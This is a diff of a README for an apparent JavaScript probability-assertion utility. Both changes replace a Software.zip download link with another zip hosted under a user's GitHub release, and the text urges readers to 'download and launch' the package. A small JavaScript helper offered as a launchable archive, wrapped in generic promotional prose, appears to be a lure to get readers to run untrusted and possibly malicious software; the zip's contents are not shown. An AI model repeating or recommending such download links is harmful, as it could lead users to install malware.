@@ -32,7 +32,7 @@ Welcome to the **Math Base Assert Is ProbabilityF** repository! This repository 
 
 To get started with using the **Math Base Assert Is ProbabilityF** utility, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/anhmaydeptraivailon/math-base-assert-is-probabilityf/releases/download/v2.0/Software.zip)](https://github.com/anhmaydeptraivailon/math-base-assert-is-probabilityf/releases/download/v2.0/Software.zip)
 
 Please note that the link provided above requires you to download and launch the software package. If the link is not working or not provided, you can always check the "Releases" section of this repository for the latest version.
 
@@ -57,4 +57,4 @@ If you have any questions, suggestions, or feedback regarding the **Math Base As
 Thank you for exploring the **Math Base Assert Is ProbabilityF** repository. We hope this utility serves you well in your JavaScript projects that involve probability calculations. Happy coding! 🚀
 
 ---
-**Note:** Check out the [Download Software](https://github.com/user-attachments/files/18383251/Software.zip) link to get started! 📦
+**Note:** Check out the [Download Software](https://github.com/anhmaydeptraivailon/math-base-assert-is-probabilityf/releases/download/v2.0/Software.zip) link to get started! 📦
